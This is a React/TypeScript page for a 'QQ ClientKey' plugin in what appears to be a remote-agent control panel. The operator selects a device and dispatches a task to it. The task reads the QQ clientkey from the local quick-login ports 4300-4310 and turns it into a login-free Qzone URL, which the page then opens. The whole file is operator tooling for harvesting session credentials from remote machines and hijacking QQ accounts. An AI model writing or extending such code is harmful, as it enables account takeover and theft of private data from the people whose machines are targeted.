import { useState } from 'react';
import { Button, Card, Chip, Spinner } from '@heroui/react';
import { usePluginHost } from '../../hooks/usePluginHost';

interface QQKeyResult {
  uin?: string;
  clientkey?: string;
  ptsigx?: string;
  error?: string;
}

function maskKey(key: string): string {
  if (!key) return '';
  if (key.length <= 8) return '*'.repeat(key.length);
  return key.slice(0, 4) + '*'.repeat(key.length - 8) + key.slice(-4);
}

/**
 * QQ ClientKey 探测插件页面。
 * 完全对齐 qq_ck_test.py：本地端口取第一个 uin 的 clientkey，jump 提取
 * ptsigx（QQ 空间免登 URL），不做 bkn/skey。
 */
export default function QQKeyPage() {
  const { selectedAgent, dispatchTask } = usePluginHost();
  const [running, setRunning] = useState(false);
  const [result, setResult] = useState<QQKeyResult | null>(null);
  const [err, setErr] = useState<string | null>(null);
  const [showRaw, setShowRaw] = useState(false);

  const run = async () => {
    if (!selectedAgent) return;
    setRunning(true);
    setErr(null);
    setResult(null);
    setShowRaw(false);
    try {
      const res = await dispatchTask('com.libra.qqkey', 'collect', {});
      setResult(res.result as QQKeyResult);
    } catch (e) {
      setErr(e instanceof Error ? e.message : '采集失败');
    } finally {
      setRunning(false);
    }
  };

  const openQzone = () => {
    if (result?.ptsigx) {
      window.open(result.ptsigx, '_blank', 'noopener');
    }
  };

  return (
    <div className="space-y-4">
      <Card className="p-6">
        <h1 className="text-xl font-semibold">QQ ClientKey 探测</h1>
        <p className="text-sm text-default-500 mt-1">
          探测本机 QQ 快速登录端口（4300-4310），取第一个已登录 uin 的 clientkey，并生成 QQ 空间免登链接。
        </p>
        <div className="mt-4 flex items-center gap-3">
          <Button variant="primary" isPending={running} isDisabled={!selectedAgent} onPress={run}>
            采集 QQ ClientKey
          </Button>
          {!selectedAgent && <Chip size="sm" color="warning">请先在顶部选择设备</Chip>}
          {result && !result.error && (
            <Button size="sm" variant="ghost" onPress={() => setShowRaw(s => !s)}>
              {showRaw ? '隐藏明文' : '显示明文'}
            </Button>
          )}
        </div>
      </Card>

      {err && <Card className="p-4 border border-danger"><p className="text-danger text-sm">{err}</p></Card>}

      {running && (
        <div className="flex items-center gap-2 text-default-500"><Spinner size="sm" /> 采集与兑换中…</div>
      )}

      {result && (
        <Card className="p-4">
          <h2 className="font-semibold mb-3">采集结果</h2>

          {result.error ? (
            <p className="text-sm text-default-500">{result.error}</p>
          ) : (
            <div className="space-y-3">
              <div className="rounded-lg border border-default-100 p-3">
                <div className="flex items-center justify-between gap-2">
                  <span className="text-sm text-default-500">UIN</span>
                  <span className="font-mono text-sm font-semibold">{result.uin || '-'}</span>
                </div>
                <div className="flex items-center justify-between gap-2 mt-2">
                  <span className="text-sm text-default-500">ClientKey</span>
                  <span className="font-mono text-xs break-all text-default-700">
                    {showRaw ? result.clientkey : maskKey(result.clientkey || '')}
                  </span>
                </div>
              </div>

              <div className="flex items-center justify-between gap-2">
                <span className="text-sm text-default-500">QQ 空间免登链接</span>
                <Button
                  variant="primary"
                  size="sm"
                  isDisabled={!result.ptsigx}
                  onPress={openQzone}
                >
                  打开 QQ 空间
                </Button>
              </div>
              {result.ptsigx ? (
                <div className="font-mono text-[11px] text-default-400 break-all bg-default-50 dark:bg-default-900 rounded p-2">
                  {result.ptsigx}
                </div>
              ) : (
                <p className="text-xs text-default-400">未生成免登链接（jump 兑换未返回 ptsigx）。</p>
              )}
            </div>
          )}
        </Card>
      )}
    </div>
  );
}
